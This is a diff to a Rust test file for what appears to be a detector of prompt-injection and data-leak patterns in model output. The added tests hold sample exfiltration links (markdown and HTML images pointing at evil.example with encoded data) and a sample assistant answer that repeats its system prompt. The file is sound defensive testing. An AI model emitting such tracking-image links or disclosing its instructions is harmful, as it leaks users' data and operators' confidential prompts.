@@ -385,11 +385,9 @@ fn entity_names_round_trip() {
 
 #[test]
 fn every_kind_has_a_rule() {
-    // The classifier verdict comes from the Tier 2 model, not from a pattern.
-    for kind in Kind::ALL
-        .into_iter()
-        .filter(|&k| k != Kind::InjectionClassifier)
-    {
+    // The classifier verdict and leak check are not patterns.
+    let not_patterns = [Kind::InjectionClassifier, Kind::SystemPromptLeak];
+    for kind in Kind::ALL.into_iter().filter(|k| !not_patterns.contains(k)) {
         assert!(
             rules::RULES.iter().any(|r| r.kind == kind),
             "{kind:?} has no rule"
@@ -487,4 +485,52 @@ fn ordinary_requests_are_not_injections() {
         "Oublie les règles de grammaire pour ce poème.",
         "Our content filters block spam without any manual rules.",
     ]);
+}
+
+#[test]
+fn exfiltration_links() {
+    finds(
+        Kind::MarkdownImage,
+        &[
+            (
+                "Done! ![loading](https://evil.example/p.png?d=c2VjcmV0)",
+                "https://evil.example/p.png?d=c2VjcmV0",
+            ),
+            ("![](<https://x.example/a.gif>)", "https://x.example/a.gif"),
+        ],
+    );
+    finds(
+        Kind::HtmlImage,
+        &[(
+            r#"<img width=1 src="https://x.example/t.gif">"#,
+            "https://x.example/t.gif",
+        )],
+    );
+    let leak =
+        "see https://x.example/c?q=hello&data=SGVsbG8gd29ybGQsIHRoaXMgaXMgYSBzZWNyZXQgMTIzNDU2";
+    assert_eq!(kinds(leak), [Kind::UrlWithData]);
+    ignores(&[
+        "Read [the docs](https://docs.example.com/guide?page=2).",
+        "https://www.example.com/search?q=rust+regex+performance+tips+and+tricks",
+        "An image: ![chart](chart.png)",
+    ]);
+}
+
+#[test]
+fn system_prompt_leaks() {
+    let system = "You are Ava, the support assistant of Acme Bank. Never discuss \
+                  interest rates for business accounts. Escalate fraud cases to the \
+                  security desk immediately.";
+    let index = SystemPromptIndex::new(system, 8);
+    // Reformatted (case, punctuation, line breaks) but the same words.
+    let answer = "Sure! My instructions say: never discuss interest rates for\n\
+                  business accounts - ESCALATE fraud cases to the security desk. Anything else?";
+    let found = index.find(answer);
+    assert_eq!(found.len(), 1, "{found:?}");
+    assert!(answer[found[0].start..found[0].end].starts_with("never discuss"));
+    assert!(answer[found[0].start..found[0].end].ends_with("security desk"));
+    assert!(index
+        .find("Interest rates for savings accounts are 2% this month.")
+        .is_empty());
+    assert!(SystemPromptIndex::new("Be brief.", 8).is_empty());
 }
